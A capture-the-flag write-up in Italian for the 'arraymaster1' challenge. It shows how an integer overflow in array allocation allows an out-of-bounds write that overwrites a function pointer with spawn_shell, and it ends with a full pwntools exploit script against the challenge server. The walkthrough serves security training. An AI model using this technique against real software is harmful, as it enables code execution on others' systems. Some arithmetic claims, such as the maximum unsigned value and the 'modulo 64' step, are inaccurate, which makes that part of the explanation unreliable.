Quando viene creato un array, il programma alloca memoria in base al tipo e alla lunghezza. Tuttavia, non viene effettuato alcun controllo sulla dimensione effettiva dell’array durante le operazioni di set e get.

Quando creiamo un array di int64_t, la dimensione totale dell’array in byte viene calcolata come:

`memory = element_size * number_of_element`

In questa challenge possiamo sfruttare un overflow aritmetico.

18446744073709551616 è il massimo valore rappresentabile da un intero senza segno

Vogliamo determinare il `numero di elementi`

`number_of_element * 8 = 2^64`

Quindi `number_of_elementi = 2^64/8 + 1`

Aggiungiamo +1 per causare l’overflow

Quando il programma calcola la memoria da allocare fa `element_size * number_of_element = 8 * 2.305.843.009.213.693.953 = 18.446.744.073.709.551.624`

Questo calcolo supera 2^{64} e provoca un overflow, riducendo la memoria effettivamente allocata.

18.446.744.073.709.551.624 % 64 = 8. Quindi l’array allocato è solo di 8 byte (un solo elemento).

```c
p.sendlineafter("> ", "init A 64 2305843009213693953")
```

```c
p.sendlineafter("> ", "init B 8 256")
```

B viene creato subito dopo A in memoria.

Questo significa che possiamo usare A per sovrascrivere strutture dati utilizzate da B.

```c
p.sendlineafter("> ", "set A 7 " + str(shell))
```

Quando il programma esegue set A 7, calcola l’offset come:
`indirizzo_base_A + (7 * 8) = indirizzo_base_A + 56`

Ma noi abbiamo solo 8 byte allocati per A, quindi stiamo sovrascrivendo oltre i limiti di A

Sfruttare una vulnerabilità di overflow aritmetico nella gestione degli array per sovrascrivere un puntatore a funzione con l’indirizzo di spawn_shell, ottenendo così una shell.
`init()` alloca memoria per la struttura dell’array

| Offset | Descrizione | Dimensione |
| --- | --- | --- |
| +0 | Tipo | 8 byte |
| +8 | Lunghezza | 8 byte |
| +16 | Puntatore ai dati | 8 byte |
| +24 | Puntatore a get | 8 byte |
| +32 | Puntatore a set | 8 byte |

Con

```c
p.sendlineafter("> ", "set A 7 " + str(shell))
```

sovrascriviamo il puntatore alla funzione get

A[7] viene calcolato come `base_address + 7 * 8`

```c
from pwn import *

HOST = "arraymaster1.challs.cyberchallenge.it"
PORT = 9125

p = remote(HOST, PORT)

exe = ELF("../Downloads/arraymaster1")
context.binary = exe

shell = exe.sym['spawn_shell']
print(shell)

p.sendlineafter("> ", "init A 64 2305843009213693953")
p.sendlineafter("> ", "init B 8 256")
p.sendlineafter("> ", "set A 7 " + str(shell))
p.sendlineafter("> ", "get B 6")
p.interactive()

```